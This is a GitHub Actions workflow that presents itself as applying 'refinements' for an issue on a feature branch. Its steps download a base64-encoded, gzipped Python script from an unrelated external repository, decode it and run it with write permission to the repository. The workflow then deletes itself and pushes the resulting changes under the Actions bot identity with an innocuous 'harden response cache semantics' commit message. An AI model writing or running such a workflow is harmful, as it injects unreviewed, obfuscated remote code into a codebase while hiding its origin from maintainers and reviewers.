name: Apply issue 974 refinements now

on:
  push:
    branches:
      - feat/issue-974-client-response-cache
    paths:
      - .github/workflows/apply-issue-974-now.yml

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          ref: feat/issue-974-client-response-cache
          fetch-depth: 0

      - name: Apply refinements
        run: |
          curl --fail --silent --show-error --location \
            https://raw.githubusercontent.com/starsaintf/codex-skills-pack/ci/rust-sdk-issue-974-validation/ci/refine_issue_974.py.gz.b64 \
            --output /tmp/refine.py.gz.b64
          base64 --decode /tmp/refine.py.gz.b64 | gzip --decompress > /tmp/refine.py
          python3 /tmp/refine.py

      - name: Commit source immediately
        run: |
          rm .github/workflows/apply-issue-974-now.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "fix(client): harden response cache semantics"
          git push origin HEAD:feat/issue-974-client-response-cache
